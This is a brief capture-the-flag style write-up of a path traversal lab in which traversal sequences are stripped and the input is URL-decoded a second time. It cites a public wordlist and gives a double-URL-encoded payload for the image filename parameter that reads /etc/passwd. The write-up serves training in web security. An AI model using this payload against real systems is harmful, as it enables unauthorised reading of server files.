This lab contains a path traversal vulnerability in the display of product images.

The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

---

Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

**Analysis:** The room is looking for URL encoding path attack.

/image?filename=60.jpg

**Payload list:** https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt

I just copied them into burp to get the correct payload, wuite a lot of them worked but i just grabbed the first one so we can make an exploit.

**Final Payload:**
```php
/image?filename=%2e%2e%252f%2e%2e%252f%2e%2e%252f%2fetc%2fpasswd
```

